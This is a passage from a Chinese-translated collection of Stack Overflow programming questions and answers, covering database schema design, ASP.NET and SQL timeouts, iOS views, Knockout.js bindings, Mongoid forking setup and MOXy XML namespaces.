Department 
```

员工：

```
EmployeeId
LoginName
FK_DepartmentId 
```

所以每个能力表应该是这样的：

```
CompetencyId
Code
Description 
```

该计划是每个人都有核心能力和相应的工作类型和分数。我的第一个想法是，获得分数的最佳方法是拥有这样的能力来评分表格：

```
CompetencyScoreId 
EmployeeId_FK
CompetencyCode_FK
Score 
```

然后我可以使用此人的 ID 从表中过滤。通过拥有多个表格分数，我猜如果有人更换部门，我只需要确保将他们从旧表格中删除并添加到新表格中

当我添加一个新用户时，我需要以某种方式将核心表作为一组行粘贴到较大的表中。这是可能的还是明智的？是否可以进行约束，使用户名和代码组合在表中是唯一的？

另一种方法是有一个表格，其中能力代码是列，每个用户在表格中都有一行，其中包含针对列的分数。我认为这样做会使添加列变得更加困难，而且我不确定如何将列名与描述相关联。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T18:46:13.313

您的部门、员工和能力表很好。

**核心竞争力**

核心能力表应如下所示

```
Core Competency
---------------
Core Competency ID
Employee ID
Competency ID
Competency Score
Competency Time Stamp 
```

如果分数可以随时间变化，您需要一个时间戳，以便您可以保持分数的变化。

主要（集群）键是核心能力 ID

员工 ID、能力 ID 和能力时间戳降序的唯一索引将允许您检索员工的行。

能力 ID 和能力时间戳降序的另一个唯一索引将允许您检索能力的行并查看分数如何随时间变化。

关于能力 ID 和能力分数降序的另一个非唯一索引将允许您检索具有给定能力的最高能力分数的员工。

**职位能力**

增加新员工时，必须同时增加核心能力。如果您有一组工作职位的核心能力，您将需要另一个看起来像这样的表格。

```
Position Competency
-------------------
Position Competency ID
Position ID
Competency ID 
```

主要（集群）键是职位能力 ID。

职位 ID 是指向职位表的外键。

职位 ID 的非唯一索引，能力 ID 将为您提供职位的所有能力。

**职位变动**

当员工改变职位时，应用程序应确定是否需要添加任何核心能力。我定义的数据库表将为应用程序提供做出决定所需的信息。

绝不应剥夺员工的核心能力。

# php - 更改 zencart 的退回电子邮件地址

> ID：15111862
> 
> 赞同：0
> 
> 时间：2013-02-27T12:12:28.673
> 
> 标签：php, phpmailer, zen-cart

我不确定这属于这里还是服务器故障，但问题是，我有一个 zencart 安装，它使用 phpMailer 发送邮件（使用“PHP”模式，即 php 的 mail() 函数）。现在，当这些邮件失败时，它们会退回到特定的邮件地址，而我需要确保退回的邮件始终发送到发送它的“发件人”地址。我认为这超出了 phpMailer 的范围，但是有什么方法可以让我正确地实现这一点吗？我真的不想运行 cron 作业，检查退回的电子邮件收件箱，然后将邮件发送到预期的位置。还有其他方法吗？

哦，如果这有帮助，我可以访问服务器的 cPanel 和 WHM，所以如果我需要修改任何设置，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T05:09:19.413

正确发送电子邮件的最有效方法是使用 SMTPAUTH 并提供有效 SMTP 邮箱的凭据。这样，“发件人”地址和退回地址将由 SMTP 服务器处理。

# ios - IOS。ScrollView 只显示一个带有图像的子视图

> ID：15111864
> 
> 赞同：1
> 
> 时间：2013-02-27T12:12:41.060
> 
> 标签：ios, objective-c, cocoa-touch

我有一个 UIScrollView，我想从 flickr 加载图像列表。然后，我希望照片的显示方式与您滚动浏览照片的原生库存 iphone 照片应用程序一样。

**这是我的代码**

```
- (void)viewDidLoad
{
    [super viewDidLoad];

    for (int i = 0; i < self.urlArray.count; i++) {
        CGRect frame;
        frame.origin.x = self.scrollView.frame.size.width * i;
        frame.origin.y = 0;
        frame.size = self.scrollView.frame.size;

        UIView *subview = [[UIView alloc] initWithFrame:frame];

        [self returnImageFromFlickr:[self.urlArray objectAtIndex:i]];

        UIImageView *imageView = self.largePhoto;

        [subview addSubview:imageView];
        [self.scrollView addSubview:subview];

    }

    self.scrollView.contentSize = CGSizeMake(self.scrollView.frame.size.width * self.urlArray.count, self.scrollView.frame.size.height);
}

-(void)returnImageFromFlickr:(NSURL *)url {

    NSURLRequest *request = [[NSURLRequest alloc] initWithURL:url];
    [self.largePhoto setImageWithURLRequest:request placeholderImage:[UIImage imageNamed:@"placeholder.png"] success:^(NSURLRequest *request, NSHTTPURLResponse *response, UIImage *image) {

        [self.largePhoto setImageWithURL:url placeholderImage:[UIImage imageNamed:@"placeholder.png"]];

    } failure:^(NSURLRequest *request, NSHTTPURLResponse *response, NSError *error) {

    }];

} 
```

正在发生的事情只显示最后一张图像。

我按照我的理解尝试了您的解决方案并得到了这个。这不是在拍照片。只是一个白屏。加上 returnImageFromFlicrk 方法中的警告

[imageView setImageWithURL:url placeholderImage:[UIImage imageNamed:@"placeholder.png"]];

说在此块中强烈捕获“imageView”可能会导致保留周期

```
- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view.

   /*for (int i = 0; i < self.urlArray.count; i++) {
        CGRect frame;
        frame.origin.x = self.scrollView.frame.size.width * i;
        frame.origin.y = 0;
        frame.size = self.scrollView.frame.size;

        UIView *subview = [[UIView alloc] initWithFrame:frame];

        [self returnImageFromFlickr:[self.urlArray objectAtIndex:i]];

        UIImageView *imageView = self.largePhoto;

        [subview addSubview:imageView];
        //subview.backgroundColor = [colors objectAtIndex:i];
        [self.scrollView addSubview:subview];

    }*/

    for (int i = 0; i < self.urlArray.count; i++) {
        CGRect frame;
        frame.origin.x = self.scrollView.frame.size.width * i;
        frame.origin.y = 0;
        frame.size = self.scrollView.frame.size;
        UIImageView *imageView = [[UIImageView alloc] init];
        [self returnImageFromFlickr:[self.urlArray objectAtIndex:i] imageview:imageView];

        [self.scrollView addSubview:imageView];

    }

    self.scrollView.contentSize = CGSizeMake(self.scrollView.frame.size.width * self.urlArray.count, self.scrollView.frame.size.height);
}

-(void)returnImageFromFlickr:(NSURL *)url imageview:(UIImageView *)imageView {
    NSURLRequest *request = [[NSURLRequest alloc] initWithURL:url];
    [imageView setImageWithURLRequest:request placeholderImage:[UIImage imageNamed:@"placeholder.png"] success:^(NSURLRequest *request, NSHTTPURLResponse *response, UIImage *image) {
        [imageView setImageWithURL:url placeholderImage:[UIImage imageNamed:@"placeholder.png"]];

    } failure:^(NSURLRequest *request, NSHTTPURLResponse *response, NSError *error) {

    }];

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:20:49.247

您没有为 Scroll 内容 pan 设置正确的参数，这就是为什么您想要的所有图像都没有显示在 scrollView 中的原因。尝试更新 ScrollView 的内容平移以适应所有图像的宽度。像

> self.scrollView.contentSize = CGSizeMake（宽度，高度）；

在这种情况下，高度将是单个图像的高度，宽度将是（单个图像的宽度 * 图像总数）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T12:26:46.780

你覆盖 self.largePhoto，你需要在 returnImageFromFlickr 中设置你的 imageView

试试这个

```
UIImageView *imageView = [[UIImageView alloc] init];
[self returnImageFromFlickr:[self.urlArray objectAtIndex:i] imageview:imageView]; 
```

和

```
-(void)returnImageFromFlickr:(NSURL *)url imageview:(UIImageView *)imageView {
    NSURLRequest *request = [[NSURLRequest alloc] initWithURL:url];
    [imageView setImageWithURLRequest:request placeholderImage:[UIImage imageNamed:@"placeholder.png"] success:^(NSURLRequest *request, NSHTTPURLResponse *response, UIImage *image) {
        [imageView setImage:image];

} failure:^(NSURLRequest *request, NSHTTPURLResponse *response, NSError *error) {

}]; 
```

}

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-28T09:58:50.337

我需要做的就是将代码从 viewDidLoad 移动到 viewDidApear

# javascript - 淘汰赛 js $index() 似乎不起作用

> ID：15111872
> 
> 赞同：0
> 
> 时间：2013-02-27T12:13:15.110
> 
> 标签：javascript, knockout.js

我正在使用下面的代码来打印 div 的 id。但是 $index() 似乎不起作用，

```
<div data-bind="foreach: itemRows">
           <div class="fruitList" data-bind="foreach: $data">
                <div data-bind="attr: { 'id': 'uniqueName_' + $index() }">
                    <img data-bind="attr: { src: $data }" />
                 </div>
           </div>
        </div> 
```

任何建议..

更新：呈现的 HTML 有这个

```
<div id="uniqueName_NaN" data-bind="attr: { 'id': 'uniqueName_' + ($parent.index +   

  $data.index) }"> 
```

身份证没有出现..我错过了什么..

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:14:26.847

它应该只是 $index，所以没有 ()

```
 <div data-bind="foreach: itemRows">
       <div class="fruitList" data-bind="foreach: $data">
            <div data-bind="attr: { 'id': 'uniqueName_' + $index }">
                <img data-bind="attr: { src: $data }" />
             </div>
       </div>
    </div> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-28T00:06:18.113

如果要使用两个循环中的索引，则需要访问父上下文。索引存储在上下文对象中，而不是`$data`.

```
<div data-bind="foreach: itemRows">
    <div class="fruitList" data-bind="foreach: $data">
        <div data-bind="attr: { 'id': 
                'uniqueName_' + $parentContext.$index() + '_' + $index() }">
            <img data-bind="attr: { src: $data }" />
        </div>
    </div>
</div> 
```

# objective-c - 如何在其他 webview xcode 中从 UIwebview 打开链接？

> ID：15111876
> 
> 赞同：0
> 
> 时间：2013-02-27T12:13:26.837
> 
> 标签：objective-c, uiwebview

我是 iPhone 开发的新手，我有一个应用程序，我在其中插入一个包含摘要的`HTML`页面（本地插入`UIWebView`），在这个页面中有链接（href），当我点击一个链接时，它的内容显示在相同`UIWebView`但我想将包含摘要的页面保留`UIWebView`在左侧的第一个页面中，并`UIWebView`在右侧的新页面中显示链接的内容。我从我读到的内容中知道我应该 `shouldStartWithLoad:`在 delegate.m 中插入该方法，但我不知道如何在我的情况下使用该方法。

你能告诉我怎么做吗？有没有教程可以清楚地解释这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:05:33.073

使用 uiwebviewDelegate 方法

```
 - (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType; 
```

如果您选择 [request.URL absoluteString]，那么您可以根据 url 制定您的逻辑。然后你需要返回 NO。

顺便说一下 UIWebView 占用大量内存，所以你应该小心。

[http://developer.apple.com/library/ios/#documentation/uikit/reference/UIWebViewDelegate_Protocol/Reference/Reference.html](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIWebViewDelegate_Protocol/Reference/Reference.html)

# asp.net - 将 ASP.net 4.0 站点转换为 4.5，但某些文件仍保留为 4.0，它们是否正确？

> ID：15111881
> 
> 赞同：1
> 
> 时间：2013-02-27T12:13:51.387
> 
> 标签：asp.net, web, web-config, asp.net-4.5

将 ASP.net 4.0 站点转换为 4.5，但某些文件仍保留为 4.0，它们是否正确？

使用视觉工作室 2012

这是我的 config.xml。你看到什么不正确的吗？System.web、system.design、system.windows.fomrs 还是 4.0？

发布时，我将调试禁用为假。还有推力水平有什么作用？我应该删除它吗？

```
<?xml version="1.0"?>
    <configuration>

      <configSections>
    <sectionGroup name="system.web">
      <section name="sanitizer" requirePermission="false"
               type="AjaxControlToolkit.Sanitizer.ProviderSanitizerSection, AjaxControlToolkit" />
    </sectionGroup>
  </configSections>

  <appSettings/>
  <connectionStrings/>

  <system.web>

    <sessionState mode="StateServer" stateConnectionString="tcpip=127.0.0.1:42424" cookieless="false" timeout="60"/>
    <compilation debug="true" targetFramework="4.5">
      <assemblies>
        <add assembly="System.Web.Extensions.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
        <add assembly="System.Design, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B03F5F7F11D50A3A"/>
        <add assembly="System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=B77A5C561934E089"/>
      </assemblies>
    </compilation>

    <trust level="Full" />

    <sanitizer defaultProvider="HtmlAgilityPackSanitizerProvider">
      <providers>
        <add name="HtmlAgilityPackSanitizerProvider" type="AjaxControlToolkit.Sanitizer.HtmlAgilityPackSanitizerProvider"></add>
      </providers>
    </sanitizer>

    <authentication mode="Windows"/>
    <customErrors mode="Off"/>
    <pages validateRequest="true" viewStateEncryptionMode="Never" enableViewStateMac="true" enableSessionState="true" controlRenderingCompatibilityVersion="4.0" clientIDMode="AutoID"/>
    <httpModules/>

  </system.web>

  <system.webServer>
    <modules runAllManagedModulesForAllRequests="false"/>
    <staticContent>
      <clientCache cacheControlMode="UseMaxAge" cacheControlMaxAge="30.00:00:00"/>
    </staticContent>
  </system.webServer>

  <system.web.extensions>
    <scripting>
      <scriptResourceHandler enableCompression="true" enableCaching="true"/>
    </scripting>
  </system.web.extensions>

</configuration> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:16:46.610

这个是正常的。并非每个框架库都使用新版本的 .NET 进行了增强。因此，如果没有将任何内容添加到参考库中，那么它会保留旧版本。

# php - 如何在 php 中导入 iCloud 联系人

> ID：15111887
> 
> 赞同：3
> 
> 时间：2013-02-27T12:14:10.323
> 
> 标签：php, icloud

如何使用 iCloud API 或任何其他使用 PHP 作为服务器端语言的方法从 iCloud 导入联系人。我知道有 iCloud 支持 cardDav 通过它我们可以导入 iCloud 联系人但是如何？这对我来说仍然是一个问题

如果有人有想法，那将非常有帮助

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-05-07T06:42:06.110

iCloud 支持 cardDAV 客户端/服务器协议，通过它我们可以向 iCloud 服务器发出请求并从 iCloud 中获取保存的联系人。

要实现 cardDAV 客户端/服务器协议，需要使用第三方 API，并且有非常有用且易于使用的 API 可用于使用**Roundcube-CardDAV完成此任务，您可以使用**[此](https://github.com/graviox/Roundcube-CardDAV)链接下载此库。

要使用**Roundcube-CardDAV**，您需要使用**PEAR.php**文件。

RoundCube-CardDAV 返回 Vcard 格式的联系人，因此也需要解析它，这可以使用[此处找到的](http://pear.php.net/package/Contact_Vcard_Parse/download)**Contact_Vcard_Parse**类来完成。

您还需要在其上发出请求的 iCloud 服务器，因此它是**[https://p01-contacts.icloud.com/1603801586/carddavhome/card/](https://p01-contacts.icloud.com/1603801586/carddavhome/card/)**其中 p01 是服务器编号，如 p02、p03、p04...p06 等

# php - PHP MySQL - 按顺序从大表中选择

> ID：15111892
> 
> 赞同：0
> 
> 时间：2013-02-27T12:14:31.733
> 
> 标签：php, mysql, select

基本上我有一个流量交换站点，由于它现在变得非常流行，它显示每个用户站点的频率比以前少得多。

流量交换中有超过17,000个站点，它们按**CPC**排名。 **CPC**代表每次点击费用，即他们愿意为每次点击他们的网站花费多少网站点数。范围为**1-10**。

每个站点的浏览时间为**20**秒，因此所有**17,000**个站点的浏览时间都将花费绝对时间，因此他们每天只能收到**1**次交换。

基本上我所追求的是一种从数据库中选择网站的方法，这使得将网站设置为**较低 CPC**的用户更公平。

我该怎么做呢？

# c# - 无法将 CommandTimeout 设置为超过 90 秒

> ID：15111894
> 
> 赞同：4
> 
> 时间：2013-02-27T12:14:35.300
> 
> 标签：c#, asp.net

我在 Visual Studio 2008 中有一个用 C# 代码编写的 asp.net Web 应用程序。

我有一个 SQL 查询，它查询另一台服务器上的 SQL Server 数据库。当我运行查询时，它会在 90 秒后超时。我尝试了各种不同的设置。

我已经搜索了互联网，但仍然找不到答案。我的代码中有一行要`CommandTimeout`为查询设置。如果我将其设置为`CommandTimeout = 1;`查询将在 1 秒后超时，如果我将其设置`CommandTimeout = 90;`为查询将在 90 秒后超时。

这一切都很好，但我的查询大约需要。运行 150 秒。如果我将代码更改为`CommandTimeout = 200;`查询仍然会在 90 秒后超时。看来我只能在小于 90 秒时更改超时。任何超过 90 秒的时间仍然会在 90 秒时超时。

这让我发疯。是否有其他设置覆盖了我的代码？

这是我的代码

```
// bind the data to the Gridview
private void BindTaskList()
{
    string startDate = StartDate.Text;
    string endDate = EndDate.Text;

    // Create a connection string referring to the connection string from web.config file
    string conStr = ConfigurationManager.ConnectionStrings["Docupro_ReportingConnectionString"].ConnectionString;

    SqlConnection sqlConnection = new SqlConnection(conStr);

    // This is the SQL query and must be in one long line
    SqlCommand sqlCommand = new SqlCommand("SELECT T5.DisplayName AS 'User', T2.LongName AS 'Print Type', SUM(T1.Quantity) AS 'Total Quantity', '£'+CONVERT(varchar, SUM(T1.Amount), 3) AS 'Total Cost' FROM tblTransaction T1 JOIN tblItem T2 ON T1.ItemID = T2.ItemID JOIN tblLedger T3 ON T1.LedgerID = T3.LedgerID JOIN tblTender T4 ON T1.TenderID = T4.TenderID JOIN tblCustomer T5 ON T4.CustomerID = T5.CustomerID JOIN tblTerminal T6 on T1.TerminalID = T6.TerminalID JOIN tblStation t7 on T6.StationID = t7.StationID WHERE (TransactionDateTime BETWEEN @StartDate AND @EndDate)AND T3.LongName = 'Not Assigned' GROUP BY T5.DisplayName, T2.LongName ORDER BY T5.DisplayName", sqlConnection);

    // Create the parameters from the text boxes and drop down list
    sqlCommand.Parameters.Add(new SqlParameter("@StartDate", startDate));
    sqlCommand.Parameters.Add(new SqlParameter("@EndDate", endDate));

    // Set the command timeout to 200 seconds to allow for long queries
    sqlCommand.CommandTimeout = 200;
    sqlConnection.Open();

    // Create a DataSet to fill with data
    SqlDataAdapter myAdapter = new SqlDataAdapter(sqlCommand);
    DataSet myDataSet = new DataSet();
    myAdapter.Fill(myDataSet);

    // Turn off GridView Footer
    GridView1.ShowFooter = false;

    // Fill the GridView with the DataSet
    GridView1.DataSource = myDataSet;
    GridView1.DataBind();
} 
```

非常感谢期待

安迪

错误信息是：

> Sys.WebForms.PageRequestManagerTimeoutException：服务器请求超时 ScriptResource.axd
> 代码：0

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T13:54:14.253

错误消息显示超时来自 ASP.NET（而不是来自 ADO.NET）。设置`Server.ScriptTimeout=200`。

解释错误消息是调试任何错误的第一步。不要只是在阅读“超时”时停下来。阅读和解释一切。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2016-02-08T12:04:22.770

FWITW...

我有一个错误（与 ASP 无关 - 这是在控制台应用程序中），我发现在设置任何参数*后*设置 CommandTimeout似乎没有生效（即使属性已更新。）

例如

```
SqlCommand comm = new SqlCommand(conn, proc);
comm.Parameters.AddWithValue("@a",123);
comm.CommandTimeout = 300;
comm.ExecuteReader(); //Times out at 30 seconds 
```

但

```
SqlCommand comm = new SqlCommand(conn, proc);
comm.CommandTimeout = 300;
comm.Parameters.AddWithValue("@a",123);
comm.ExecuteReader(); //Times out at 300 seconds 
```

我确实有一个返回 SqlCommand 的函数，然后在返回时执行它，但我*猜*这个简化版本会产生相同的结果。

## 总之

尝试在更新 SqlCommand 后立即设置 CommandTimeout 属性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T12:19:17.593

您是否尝试将其设置为`0`?

## 评论

> 值 0 表示没有限制，应在 CommandTimeout 中避免，因为尝试执行命令将无限期地等待。

[这是](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlcommand.commandtimeout%28v=vs.71%29.aspx)参考。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-10-24T10:42:14.443

SQLcommand中存在TimeOut，SqlConnection中存在TimeOut

```
 ServerPath = "Data Source=" + myDr["server1"].ToString();
                ServerPath += ";Initial Catalog=" + myDr["catalog1"].ToString();
                ServerPath += ";uid=" + myDr["username"].ToString();
                ServerPath += ";pwd=" + myDr["password1"].ToString();
                ServerPath += ";Connect Timeout=" + TimeOuted.ToString();

 conn1.ConnectionString = ServerPath; 
```

# c# - DragDrop事件返回form中的位置，拖放在flowLayoutPanel中

> ID：15111895
> 
> 赞同：2
> 
> 时间：2013-02-27T12:14:37.010
> 
> 标签：c#, .net, winforms, visual-studio

我在 FlowlayoutPanel 中拖放图片框，但事件返回表单中的位置...我需要 FlowLayoutPanel 中的这个位置（图片框在 FlowLayoutPanel 中并且正在拖放到那里）

```
 public Form1()
    {
        InitializeComponent();

        flowLayoutPanel1.AllowDrop = true;
    }

    private void pictureBox_MouseDown(object sender, MouseEventArgs e)
    {
        if (e.Button == MouseButtons.Left)
        {
            picBox = (PictureBox)sender;
            if (picBox.Image != null)
            {
                var dragImage = new Bitmap((Bitmap)picBox.Image, picBox.Size);
                IntPtr icon = dragImage.GetHicon();
                Cursor.Current = new Cursor(icon);
                DoDragDrop(picBox.Image, DragDropEffects.Copy);
            }
        }
    }

        void Form1_DragEnter(object sender, DragEventArgs e)
    {
        if (e.Data.GetDataPresent(typeof(Bitmap)))
            e.Effect = DragDropEffects.Copy;
    }

    // Occurs when the user releases the mouse over the drop target 
    void Form1_DragDrop(object sender, DragEventArgs e)
    {
       MessageBox.Show("Posicao x " + e.Y + "Posicao Y " + e.Y);//reutrn the position in form, not in flowLayoutPanel
    } 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T12:17:42.600

您必须使用此方法：

```
var point = flowLayoutPanel1.PointToClient(new Point(e.X, e.Y)); 
```

这会将屏幕位置坐标转换为控制一，更多信息[在这里](http://msdn.microsoft.com/en-us/library/system.windows.forms.control.pointtoclient.aspx)。

# oracleforms - 在 oracle 表中生成数据的 Web 视图

> ID：15111900
> 
> 赞同：0
> 
> 时间：2013-02-27T12:14:46.717
> 
> 标签：oracleforms

我有一个基于系统中已经存在的以下要求

1.  持久性存储是 Oracle 11g。没有容器在使用。
2.  db 在 linux 5.6 服务器上。
3.  有一堆相关的表 - 大约 10
4.  这些表上有一些视图，以方便访问相关数据

要求 -

1.  在浏览器的表/视图中显示数据。
2.  还允许通过页面编辑一些数据。
3.  从一页导航到另一页
4.  到目前为止，性能不是限制。

我应该从哪里开始，使用什么，如何使用？注意 - 限制 - 时间（2 周）和金钱（还没有制裁）。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T21:34:48.390

也许您对[Oracle Apex](http://www.oracle.com/technetwork/developer-tools/apex/overview/index.html)感兴趣？

# ruby-on-rails - Heroku 的 Rails、Mongoid 和 Unicorn 配置

> ID：15111902
> 
> 赞同：31
> 
> 时间：2013-02-27T12:14:53.427
> 
> 标签：ruby-on-rails, mongodb, heroku, mongoid, unicorn

我正在使用 Mongoid 3、Rails 3.2.9 和 Unicorn 进行生产。想设置一个 before_fork 和 after_fork 来连接到 mongodb，找到以下活动记录代码：

```
before_fork do |server, worker|
  # Replace with MongoDB or whatever
  if defined?(ActiveRecord::Base)
    ActiveRecord::Base.connection.disconnect!
    Rails.logger.info('Disconnected from ActiveRecord')
  end
end

after_fork do |server, worker|
  # Replace with MongoDB or whatever
  if defined?(ActiveRecord::Base)
    ActiveRecord::Base.establish_connection
    Rails.logger.info('Connected to ActiveRecord')
  end
end 
```

Mongoid（连接和断开）的相关代码是什么？

**更新：**

您实际上不需要这样做，因此对于查看此问题的人，请参阅：

[http://mongoid.org/en/mongoid/docs/rails.html](http://mongoid.org/en/mongoid/docs/rails.html)

“独角兽与乘客

在使用 Unicorn 或Passenger 时，每次使用app 预加载或智能生成时分叉子进程时，Mongoid 都会自动重新连接到主数据库。如果您在应用程序中手动执行此操作，则可以删除您的代码。”

虽然知道什么是等效的 Mongoid 代码仍然很有趣。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-03-20T08:02:25.833

您实际上不需要这样做，因此对于查看此问题的人，请参阅：

[http://mongoid.org/en/mongoid/docs/rails.html](http://mongoid.org/en/mongoid/docs/rails.html)

“独角兽与乘客

在使用 Unicorn 或Passenger 时，每次使用app 预加载或智能生成时分叉子进程时，Mongoid 都会自动重新连接到主数据库。如果您在应用程序中手动执行此操作，则可以删除您的代码。”

虽然知道什么是等效的 Mongoid 代码仍然很有趣。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-11-24T10:00:22.097

关于什么 `::Mongoid.default_session.connect ::Mongoid.default_session.disconnect`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-07-10T03:03:11.113

[https://docs.mongodb.com/mongoid/current/tutorials/mongoid-configuration/#usage-with-forking-servers](https://docs.mongodb.com/mongoid/current/tutorials/mongoid-configuration/#usage-with-forking-servers)

mongodb.com 上的文档说，独角兽或乘客的 after_fork 和 before_fork 是必需的。

这可能最近发生了变化。这是 7.0 mongoid 文档

# xml - 如何让 EclipseLink JAXB (MOXy) 不在 XML 输出中显示命名空间

> ID：15111903
> 
> 赞同：2
> 
> 时间：2013-02-27T12:14:54.400
> 
> 标签：xml, jaxb, eclipselink, moxy

我正在尝试从 JAXB 参考实现转移到 EclipseLink JAXB (MOXy)，因为[当数据包含不可显示的字符时，它似乎可以解决 JAXB 输出无效 XML](https://stackoverflow.com/questions/13230620/jaxb-outputting-invalid-xml-when-data-contains-non-displayable-chars)但我在显示命名空间标签时遇到问题。

这就是我创建一个`JAXBContext`

```
return JAXBContext.newInstance("org.musicbrainz.mmd2"); 
```

这是我得到的输出

```
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
    <metadata created="2013-02-27T12:12:13.305Z" 
        xmlns="http://musicbrainz.org/ns/mmd-2.0#" 
        xmlns:ext="http://musicbrainz.org/ns/ext#-2.0">
        <annotation-list count="1" offset="0">
            <annotation type="release" ext:score="100">
                <entity>bdb24cb5-404b-4f60-bba4-7b730325ae47</entity>
                <name>Pieds nus sur la braise</name>
                <text>EAN: 0828768226629 - DiscID: TWj6cLku360MfFYAq_MEaT_stgc-</text>
            </annotation>
        </annotation-list>
    </metadata> 
```

我正在尝试使用 EclipseLink MOXy 获得相同的输出，我得到的上下文如下

```
 Map<String, Object> properties = new HashMap<String, Object>(1);
 properties.put(JAXBContextProperties.MEDIA_TYPE, "application/xml");
 return JAXBContextFactory.createContext(new Class[]{Metadata.class}, properties); 
```

这会产生

```
<?xml version="1.0" encoding="UTF-8"?>
<ns0:metadata 
   xmlns:ns0="http://musicbrainz.org/ns/mmd-2.0#" 
   xmlns:ext="http://musicbrainz.org/ns/ext#-2.0" 
   created="2013-02-27T12:11:35.511Z">
   <ns0:annotation-list count="1" offset="0">
      <ns0:annotation type="release" ext:score="100">
         <ns0:entity>bdb24cb5-404b-4f60-bba4-7b730325ae47</ns0:entity>
         <ns0:name>Pieds nus sur la braise</ns0:name>
         <ns0:text>EAN: 0828768226629 - DiscID: TWj6cLku360MfFYAq_MEaT_stgc-</ns0:text>
      </ns0:annotation>
   </ns0:annotation-list>
</ns0:metadata> 
```

我不想要 ns0 的东西，我可以摆脱它吗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T14:25:58.243

**问题 #1 - 使用默认命名空间**

**包信息**

我们将使用包级别`@XmlSchema`注释来指定命名空间限定。我们还将建议不要为命名空间使用前缀`http://musicbrainz.org/ns/mmd-2.0#`，并且将`ext`前缀用于`http://musicbrainz.org/ns/ext#-2.0"`命名空间。

```
@XmlSchema(
    namespace="http://musicbrainz.org/ns/mmd-2.0#",
    xmlns={
        @XmlNs(namespaceURI="http://musicbrainz.org/ns/mmd-2.0#", prefix=""),
        @XmlNs(namespaceURI = "http://musicbrainz.org/ns/ext#-2.0", prefix = "ext")
    }
)
package forum15111903;

import javax.xml.bind.annotation.*; 
```

**元数据**

您的域模型中不必包含命名空间信息，`http://musicbrainz.org/ns/mmd-2.0#`因为默认情况下它将应用于此包中的所有元素。

```
package forum15111903;

import javax.xml.bind.annotation.*;
import javax.xml.datatype.XMLGregorianCalendar;

@XmlRootElement
@XmlAccessorType(XmlAccessType.FIELD)
public class Metadata {

    @XmlAttribute
    private XMLGregorianCalendar created;

} 
```

**了解更多信息**

*   [http://blog.bdoughan.com/2011/11/jaxb-and-namespace-prefixes.html](http://blog.bdoughan.com/2011/11/jaxb-and-namespace-prefixes.html)

* * *

**问题 #2 - 将 MOXy 引导为 JAXB (JSR-222) 提供者**

**选项 #1 - 使用标准 JAXB API**

`jaxb.properties`您可以使用以下条目在与模型类相同的包中包含一个文件（请参阅： [http](http://blog.bdoughan.com/2011/05/specifying-eclipselink-moxy-as-your.html) ://blog.bdoughan.com/2011/05/specifying-eclipselink-moxy-as-your.html ）：

```
javax.xml.bind.context.factory=org.eclipse.persistence.jaxb.JAXBContextFactory 
```

然后你可以引导你`JAXBContext`如下：

```
package forum15111903;

import java.io.File;
import javax.xml.bind.*;

public class Demo {

    public static void main(String[] args) throws Exception {
        JAXBContext jc = JAXBContext.newInstance(Metadata.class);

        Unmarshaller unmarshaller = jc.createUnmarshaller();
        File xml = new File("src/forum15111903/input.xml");
        Metadata metadata = (Metadata) unmarshaller.unmarshal(xml);

        Marshaller marshaller = jc.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        marshaller.marshal(metadata, System.out);
    }

} 
```

**选项 #2 - 使用 MOXy 的本机 API**

如果您不想使用`jaxb.properties`文件，则可以利用 MOXy`JAXBContextFactory`类并执行以下操作：

```
package forum15111903;

import java.io.File;
import javax.xml.bind.*;
import org.eclipse.persistence.jaxb.JAXBContextFactory;

public class Demo {

    public static void main(String[] args) throws Exception {
        JAXBContext jc = JAXBContextFactory.createContext(new Class[] {Metadata.class}, null);

        Unmarshaller unmarshaller = jc.createUnmarshaller();
        File xml = new File("src/forum15111903/input.xml");
        Metadata metadata = (Metadata) unmarshaller.unmarshal(xml);

        Marshaller marshaller = jc.createMarshaller();
        marshaller.setProperty(Marshaller.JAXB_FORMATTED_OUTPUT, true);
        marshaller.marshal(metadata, System.out);
    }

} 
```

* * *

**问题 #3 - properties.put(JAXBContextProperties.MEDIA_TYPE, "application/xml");**

MOXy 的默认媒体类型是`application/xml`，您可以使用此属性指定`application/json`获取 JSON 输出。

*   [http://blog.bdoughan.com/2011/08/json-binding-with-eclipselink-moxy.html](http://blog.bdoughan.com/2011/08/json-binding-with-eclipselink-moxy.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:40:45.470

而不是`JAXBContextFactory`直接使用，只需创建一个名为`jaxb.properties`包含该行的文件

```
javax.xml.bind.context.factory=org.eclipse.persistence.jaxb.JAXBContextFactory 
```

